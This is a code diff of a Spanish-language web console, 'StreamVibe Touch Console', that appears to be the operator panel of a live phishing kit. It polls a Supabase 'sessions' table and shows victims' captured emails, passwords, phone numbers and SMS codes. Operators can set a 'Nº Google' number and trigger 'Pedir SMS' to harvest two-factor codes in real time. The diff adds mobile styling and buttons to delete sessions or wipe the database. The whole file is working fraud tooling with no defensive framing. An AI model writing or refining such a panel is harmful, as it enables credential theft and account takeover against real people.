@@ -2,19 +2,31 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>StreamVibe Console</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreamVibe Touch Console</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { background-color: #050505; color: #a1a1aa; font-family: system-ui, -apple-system, sans-serif; }
+        .touch-btn { touch-action: manipulation; } /* Optimiza el toque en móviles */
+        .card-active { border-color: #06b6d4; box-shadow: 0 0 15px rgba(6, 182, 212, 0.1); }
+    </style>
 </head>
-<body class="bg-zinc-950 text-zinc-400 p-8">
+<body class="p-4 md:p-8">
     <div class="max-w-6xl mx-auto">
-        <header class="flex justify-between items-center mb-10 border-b border-zinc-800 pb-6">
-            <h1 class="text-2xl font-black text-cyan-500 italic uppercase">StreamVibe <span class="text-white">C4 Console</span></h1>
-            <div class="text-xs font-mono">Status: <span class="text-green-500">ONLINE</span></div>
+        <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4 border-b border-zinc-800 pb-6">
+            <div class="text-center md:text-left">
+                <h1 class="text-xl font-black text-white italic uppercase tracking-tighter">SV <span class="text-cyan-500">TOUCH</span> CONSOLE</h1>
+                <p class="text-[9px] text-zinc-600 font-bold tracking-widest uppercase">Optimizado para dispositivos móviles</p>
+            </div>
+            
+            <button onclick="clearAll()" class="touch-btn w-full md:w-auto bg-red-600/20 border border-red-600 text-red-500 px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest">
+                Limpiar Base de Datos
+            </button>
         </header>
 
-        <div id="list" class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
-            <!-- Cargando sesiones... -->
+        <div id="list" class="grid gap-4 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3">
+            <!-- Las sesiones aparecerán aquí -->
         </div>
     </div>
 
@@ -24,21 +36,52 @@
         const client = supabase.createClient(S_URL, S_KEY);
 
         async function load() {
-            const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+            const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+            if (error) return;
+            
             const list = document.getElementById('list');
+            if (!data || data.length === 0) {
+                list.innerHTML = `<div class="col-span-full py-20 text-center border-2 border-dashed border-zinc-900 rounded-3xl text-zinc-800 font-bold uppercase text-xs tracking-widest">Esperando conexiones...</div>`;
+                return;
+            }
+
             list.innerHTML = data.map(s => `
-                <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-2xl">
-                    <div class="flex justify-between items-start mb-4">
-                        <span class="text-[10px] font-bold bg-zinc-800 px-2 py-1 rounded">${s.session_id}</span>
-                        <span class="text-[10px] text-cyan-500 uppercase">${s.step}</span>
+                <div class="bg-zinc-950 border border-zinc-800 p-5 rounded-2xl relative flex flex-col gap-4 ${s.step !== 'end' ? 'card-active' : ''}">
+                    <!-- Botón eliminar visible siempre para táctil -->
+                    <button onclick="deleteSession('${s.session_id}')" class="touch-btn absolute top-3 right-3 w-10 h-10 bg-zinc-900 border border-zinc-800 text-red-500 rounded-xl flex items-center justify-center font-bold">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                    </button>
+                    
+                    <div>
+                        <div class="flex items-center gap-2 mb-1">
+                            <span class="text-[10px] font-mono text-zinc-500 uppercase">${s.session_id}</span>
+                            <span class="w-2 h-2 rounded-full ${s.step === 'end' ? 'bg-green-500' : 'bg-cyan-500 animate-pulse'}"></span>
+                        </div>
+                        <p class="text-white font-bold text-base truncate select-all">${s.email || '---'}</p>
+                        <p class="text-xs text-zinc-500 font-mono select-all">${s.password || '---'}</p>
                     </div>
-                    <p class="text-white font-bold truncate">${s.email || '---'}</p>
-                    <p class="text-sm text-zinc-500 mb-4">${s.password || '---'}</p>
+
+                    <div class="grid grid-cols-2 gap-2 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
+                        <div class="border-r border-zinc-800">
+                            <p class="text-[8px] font-bold text-zinc-600 uppercase">Teléfono</p>
+                            <p class="text-xs text-zinc-300 font-bold">${s.phone || '---'}</p>
+                        </div>
+                        <div class="pl-2">
+                            <p class="text-[8px] font-bold text-cyan-600 uppercase">SMS Recibido</p>
+                            <p class="text-lg font-black text-cyan-400 tracking-tighter">${s.sms || '......'}</p>
+                        </div>
+                    </div>
+
                     <div class="flex gap-2">
-                        <input type="text" placeholder="Num" value="${s.target_num || ''}" 
-                               class="w-16 bg-black border border-zinc-700 rounded text-center text-cyan-400 font-bold"
-                               onchange="updateNum('${s.session_id}', this.value)">
-                        <button onclick="changeStep('${s.session_id}', 'sms')" class="flex-1 bg-cyan-600 text-black font-bold text-[10px] rounded uppercase">Pedir SMS</button>
+                        <div class="w-24">
+                            <p class="text-[8px] text-center font-bold text-zinc-600 mb-1 uppercase italic">Nº Google</p>
+                            <input type="number" value="${s.target_num || ''}" 
+                                   class="w-full bg-zinc-900 border border-zinc-700 rounded-xl p-3 text-center text-yellow-500 font-black text-xl outline-none"
+                                   onchange="updateNum('${s.session_id}', this.value)">
+                        </div>
+                        <button onclick="changeStep('${s.session_id}', 'sms')" class="touch-btn flex-1 bg-cyan-600 active:bg-cyan-700 text-black font-black text-xs rounded-xl uppercase tracking-tighter transition shadow-lg shadow-cyan-900/20">
+                            Pedir SMS
+                        </button>
                     </div>
                 </div>
             `).join('');
@@ -51,6 +94,25 @@
         async function changeStep(id, step) {
             await client.from('sessions').update({ step: step, updated_at: new Date().toISOString() }).eq('session_id', id);
             load();
+        }
+
+        async function deleteSession(id) {
+            if(confirm('¿Eliminar sesión?')) {
+                await client.from('sessions').delete().eq('session_id', id);
+                load();
+            }
+        }
+
+        async function clearAll() {
+            if(confirm('¿Borrar TODA la base de datos?')) {
+                const { data } = await client.from('sessions').select('session_id');
+                if(data) {
+                    for (const row of data) {
+                        await client.from('sessions').delete().eq('session_id', row.session_id);
+                    }
+                }
+                load();
+            }
         }
 
         setInterval(load, 3000);
